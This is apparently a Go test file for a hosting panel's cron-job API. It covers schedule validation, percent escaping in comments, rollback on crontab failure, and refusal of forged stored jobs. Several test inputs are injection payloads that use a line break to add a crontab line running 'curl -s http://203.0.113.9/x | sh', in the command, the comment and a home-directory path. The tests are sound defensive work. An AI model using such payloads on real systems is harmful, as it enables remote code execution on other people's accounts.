package api

import (
	"net/http"
	"strings"
	"testing"

	"monopanel/internal/agent"
	"monopanel/internal/store"
)

// The administrator sees every user's jobs at once, with their owners.
func TestCronListAll(t *testing.T) {
	f := newSiteFixture(t)
	f.call(http.MethodPost, "/users/alex/cron", map[string]any{"schedule": "*/5 * * * *", "command": "php cron.php"}, http.StatusCreated, nil)
	var all []store.CronJob
	f.call(http.MethodGet, "/cron", nil, http.StatusOK, &all)
	if len(all) != 1 || all[0].Login != "alex" || all[0].Command != "php cron.php" {
		t.Fatalf("все задания: %+v", all)
	}
}

// The schedules the panel accepts are the ones crontab accepts: Debian's
// cron and cronie read them the same way. What only Go's cron libraries know
// is refused before anything is stored.
func TestValidateCronSchedule(t *testing.T) {
	for _, ok := range []string{
		"*/5 * * * *", "0 3 * * *", "59 23 31 12 6", "0 0 1 1 *",
		"@reboot", "@yearly", "@annually", "@monthly", "@weekly", "@daily", "@midnight", "@hourly",
		"0 9-17/2 * * mon-fri", "15,45 * * * 1,3,5", "0 0 * jan-jun/2 sun", "0 0 * * MON",
		"0 0 * * 7", "0 0 * * 0-7", "*/60 * * * *", "0 */24 * * *", "0 0 */31 * *",
		"  0  3 * * *  ", "0\t3\t*\t*\t*", "05 03 * * *",
	} {
		if err := validateCronSchedule(ok); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
	for bad, why := range map[string]string{
		"":                          "empty",
		"   ":                       "empty",
		"@every 5m":                 "@every is not cron syntax",
		"@every":                    "@every is not cron syntax",
		"@Daily":                    "is not a schedule cron knows",
		"@weekdays":                 "is not a schedule cron knows",
		"@daily 0":                  "is not a schedule cron knows",
		"* * * *":                   "4 fields",
		"* * * * * *":               "6 fields",
		"TZ=UTC 0 6 * * *":          "6 fields",
		"CRON_TZ=UTC 0 6 * * *":     "6 fields",
		"*/5 * * * ?":               `"?" is not a number`,
		"5/10 * * * *":              "a step only after * or a range: */10, or 5-59/10",
		"*/0 * * * *":               "step",
		"*/61 * * * *":              "step",
		"60 * * * *":                "minute",
		"* 24 * * *":                "hour",
		"* * 0 * *":                 "day of month",
		"* * 32 * *":                "day of month",
		"* * * 13 *":                "month",
		"* * * January *":           "month",
		"* * * * 8":                 "day of week",
		"* * * * mon-":              "day of week",
		"10-5 * * * *":              "runs backwards",
		"1,,2 * * * *":              "minute",
		"-5 * * * *":                "minute",
		"L * * * *":                 "minute",
		"0 6 * * *\n* * * * * evil": "cron reads Latin letters",
		"0 6 * * *\r":               "cron reads Latin letters",
		"0\u00a06 * * *":            "cron reads Latin letters",
	} {
		err := validateCronSchedule(bad)
		if err == nil || !strings.Contains(err.Error(), why) {
			t.Errorf("%q: %v, want an error about %q", bad, err, why)
		}
	}
	if err := validateCronSchedule(strings.Repeat("1,", 40) + "1 * * * *"); err == nil || !strings.Contains(err.Error(), "at most 64") {
		t.Errorf("a long schedule: %v", err)
	}
}

// The command and the comment are one line each: a line break in either
// would add a crontab line of the account's choosing.
func TestValidateCronJob(t *testing.T) {
	long := strings.Repeat("я", maxCronComment)
	for _, c := range []struct{ command, comment string }{
		{"php cron.php", ""},
		{"php\tcron.php --say='%'", "nightly; 50% of the queue"},
		{"php cron.php", long},
	} {
		if err := validateCronJob("@daily", c.command, c.comment); err != nil {
			t.Errorf("%q / %q refused: %v", c.command, c.comment, err)
		}
	}
	for name, c := range map[string]struct{ command, comment, why string }{
		"no command":            {"  ", "", "command"},
		"newline in command":    {"php cron.php\n* * * * * curl evil", "", "command"},
		"CR in command":         {"php cron.php\r", "", "command"},
		"NUL in command":        {"php\x00cron.php", "", "command"},
		"escape in command":     {"php \x1b[2Jcron.php", "", "command"},
		"C1 control in command": {"php \u009bcron.php", "", "command"},
		"long command":          {strings.Repeat("x", maxCronCommand+1), "", "command"},
		"newline in comment":    {"php cron.php", "x\n* * * * * curl evil", "comment"},
		"long comment":          {"php cron.php", long + "я", "comment"},
	} {
		err := validateCronJob("@daily", c.command, c.comment)
		if err == nil || !strings.Contains(err.Error(), c.why) {
			t.Errorf("%s: %v", name, err)
		}
	}
	if err := validateCronJob("@every 1m", "php cron.php", ""); err == nil || !strings.HasPrefix(err.Error(), "schedule: ") {
		t.Errorf("a bad schedule: %v", err)
	}
}

// A % ends cron's command and feeds the rest to its standard input: in the
// comment, which follows the command on the line, it must stay a character.
func TestCronCommentEscapesPercent(t *testing.T) {
	for in, want := range map[string]string{
		"nightly":       "nightly",
		"at 50% load":   `at 50\% load`,
		`at 50\% load`:  `at 50\% load`,
		"100%%":         `100\%\%`,
		`a\\%`:          `a\\\%`,
		`trailing\`:     `trailing\`,
		`\a%`:           `\a\%`,
		"%":             `\%`,
		`%\%`:           `\%\%`,
		`50\\\%`:        `50\\\%`,
		"без % пробела": `без \% пробела`,
	} {
		if got := crontabComment(in); got != want {
			t.Errorf("crontabComment(%q) = %q, want %q", in, got, want)
		}
	}
}

// lastCrontab is the crontab the panel installed last.
func lastCrontab(f *siteFixture) string {
	text := ""
	for _, tool := range f.agent.Tools() {
		if tool.Name == "crontab" {
			text = tool.Stdin
		}
	}
	return text
}

// @reboot is a cron schedule and works; @every is not and never reaches the
// crontab; neither does a line break in the command or the comment.
func TestCronCreateFollowsCron(t *testing.T) {
	f := newSiteFixture(t)
	var job store.CronJob
	f.call(http.MethodPost, "/users/alex/cron", map[string]any{"schedule": " @reboot ", "command": "/usr/bin/php worker.php\n", "comment": "at 50% load"}, http.StatusCreated, &job)
	if job.Schedule != "@reboot" || job.Command != "/usr/bin/php worker.php" || job.Comment != "at 50% load" {
		t.Fatalf("stored: %+v", job)
	}
	if tab := lastCrontab(f); !strings.Contains(tab, "\n@reboot /usr/bin/php worker.php  # at 50\\% load\n") {
		t.Fatalf("crontab:\n%s", tab)
	}
	installs := len(f.agent.Tools())
	for name, body := range map[string]map[string]any{
		"@every":             {"schedule": "@every 5m", "command": "php cron.php"},
		"a step after a day": {"schedule": "5/10 * * * *", "command": "php cron.php"},
		"newline in command": {"schedule": "@daily", "command": "php cron.php\n* * * * * curl -s http://203.0.113.9/x | sh"},
		"newline in comment": {"schedule": "@daily", "command": "php cron.php", "comment": "x\n* * * * * curl -s http://203.0.113.9/x | sh"},
		"long comment":       {"schedule": "@daily", "command": "php cron.php", "comment": strings.Repeat("x", 121)},
	} {
		if code, detail := fwCall(f, http.MethodPost, "/users/alex/cron", body); code != http.StatusUnprocessableEntity {
			t.Errorf("%s: %d %s", name, code, detail)
		}
	}
	if len(f.agent.Tools()) != installs {
		t.Fatal("a refused job reached the agent")
	}
	if list, _ := f.db.ListCronJobs(f.ctx, job.UserID); len(list) != 1 {
		t.Fatalf("refused jobs were stored: %+v", list)
	}
}

// failCrontab makes the account's crontab install fail, as crontab does
// with a file it refuses.
func failCrontab(f *siteFixture, fail bool) {
	f.agent.ToolHook = nil
	if fail {
		f.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
			if req.Name == "crontab" {
				return &agent.ToolResponse{ExitCode: 1, Output: "\"-\":3: bad minute\nerrors in crontab file, can't install."}
			}
			return nil
		}
	}
}

// When crontab refuses the change, the store keeps the job as the crontab
// has it: otherwise every later rewrite of the account's crontab would trip
// over the refused value.
func TestCronUpdateRollsBackWhatCrontabRefused(t *testing.T) {
	f := newSiteFixture(t)
	var job store.CronJob
	f.call(http.MethodPost, "/users/alex/cron", map[string]any{"schedule": "*/5 * * * *", "command": "php cron.php", "comment": "queue"}, http.StatusCreated, &job)
	failCrontab(f, true)
	if code, detail := fwCall(f, http.MethodPatch, "/users/alex/cron/"+itoa(job.ID), map[string]any{"schedule": "0 4 * * *", "command": "php other.php", "comment": "", "enabled": false}); code != http.StatusBadGateway || !strings.Contains(detail, "can't install") {
		t.Fatalf("refused by crontab: %d %s", code, detail)
	}
	back, err := f.db.GetCronJob(f.ctx, job.ID)
	if err != nil || back.Schedule != "*/5 * * * *" || back.Command != "php cron.php" || back.Comment != "queue" || !back.Enabled {
		t.Fatalf("the store kept the refused change: %+v %v", back, err)
	}
	failCrontab(f, false)
	f.call(http.MethodPatch, "/users/alex/cron/"+itoa(job.ID), map[string]any{"schedule": "0 4 * * *"}, http.StatusOK, nil)
	if back, _ := f.db.GetCronJob(f.ctx, job.ID); back.Schedule != "0 4 * * *" || back.Command != "php cron.php" || back.Comment != "queue" {
		t.Fatalf("after a good change: %+v", back)
	}

	// The update obeys the same rules as the create, the comment included.
	for name, body := range map[string]map[string]any{
		"@every":          {"schedule": "@every 1h"},
		"blank command":   {"command": "   "},
		"long comment":    {"comment": strings.Repeat("x", 121)},
		"comment newline": {"comment": "a\nb"},
	} {
		if code, detail := fwCall(f, http.MethodPatch, "/users/alex/cron/"+itoa(job.ID), body); code != http.StatusUnprocessableEntity {
			t.Errorf("%s: %d %s", name, code, detail)
		}
	}
	f.call(http.MethodPatch, "/users/alex/cron/"+itoa(job.ID), map[string]any{"comment": strings.Repeat("я", 120)}, http.StatusOK, nil)
}

// A delete the crontab cannot follow keeps the job: it still runs from the
// old crontab, so the panel must still show it and be able to delete it.
func TestCronDeleteKeepsWhatStillRuns(t *testing.T) {
	f := newSiteFixture(t)
	var keep, gone store.CronJob
	f.call(http.MethodPost, "/users/alex/cron", map[string]any{"schedule": "@daily", "command": "php keep.php"}, http.StatusCreated, &keep)
	f.call(http.MethodPost, "/users/alex/cron", map[string]any{"schedule": "@hourly", "command": "php gone.php"}, http.StatusCreated, &gone)
	failCrontab(f, true)
	if code, _ := fwCall(f, http.MethodDelete, "/users/alex/cron/"+itoa(gone.ID), nil); code != http.StatusBadGateway {
		t.Fatalf("delete refused by crontab: %d", code)
	}
	if _, err := f.db.GetCronJob(f.ctx, gone.ID); err != nil {
		t.Fatalf("the job is gone from the panel while the crontab still runs it: %v", err)
	}
	failCrontab(f, false)
	f.call(http.MethodDelete, "/users/alex/cron/"+itoa(gone.ID), nil, http.StatusNoContent, nil)
	if _, err := f.db.GetCronJob(f.ctx, gone.ID); err == nil {
		t.Fatal("the job was not deleted")
	}
	if tab := lastCrontab(f); strings.Contains(tab, "gone.php") || !strings.Contains(tab, "@daily php keep.php") {
		t.Fatalf("crontab after the delete:\n%s", tab)
	}
}

// A job that came into the store another way (an import, an older version)
// with a line break in it is never written: the install stops and names the
// job; fixing that job brings the crontab back.
func TestCrontabRefusesForgedLines(t *testing.T) {
	f := newSiteFixture(t)
	alex, err := f.db.GetUserByLogin(f.ctx, "alex")
	if err != nil {
		t.Fatal(err)
	}
	bad := &store.CronJob{UserID: alex.ID, Schedule: "@daily", Command: "php cron.php", Comment: "x\n* * * * * curl -s http://203.0.113.9/x | sh", Enabled: true}
	if err := f.db.CreateCronJob(f.ctx, bad); err != nil {
		t.Fatal(err)
	}
	code, detail := fwCall(f, http.MethodPost, "/users/alex/cron", map[string]any{"schedule": "@hourly", "command": "php other.php"})
	if code != http.StatusBadGateway || !strings.Contains(detail, "cron job "+itoa(bad.ID)+" of alex: the comment has a line break") {
		t.Fatalf("install with a forged line: %d %s", code, detail)
	}
	if tab := lastCrontab(f); strings.Contains(tab, "203.0.113.9") {
		t.Fatalf("the forged line reached crontab:\n%s", tab)
	}
	if list, _ := f.db.ListCronJobs(f.ctx, alex.ID); len(list) != 1 {
		t.Fatalf("the new job was kept although nothing was installed: %+v", list)
	}
	f.call(http.MethodPatch, "/users/alex/cron/"+itoa(bad.ID), map[string]any{"comment": "nightly"}, http.StatusOK, nil)
	if tab := lastCrontab(f); !strings.Contains(tab, "@daily php cron.php  # nightly") || strings.Contains(tab, "203.0.113.9") {
		t.Fatalf("crontab after the fix:\n%s", tab)
	}

	// The account's home is in the header (PATH=<home>/data/bin:…).
	if err := f.db.SetUserUnix(f.ctx, alex.ID, *alex.UnixUID, *alex.UnixGID, "/var/www/alex\n* * * * * curl -s http://203.0.113.9/x | sh\n#"); err != nil {
		t.Fatal(err)
	}
	installs := len(f.agent.Tools())
	code, detail = fwCall(f, http.MethodPatch, "/users/alex/cron/"+itoa(bad.ID), map[string]any{"comment": "daily"})
	if code != http.StatusBadGateway || !strings.Contains(detail, `account "alex": the login or the home has a line break`) {
		t.Fatalf("install with a forged home: %d %s", code, detail)
	}
	if len(f.agent.Tools()) != installs {
		t.Fatal("a crontab with a forged home reached the agent")
	}
}
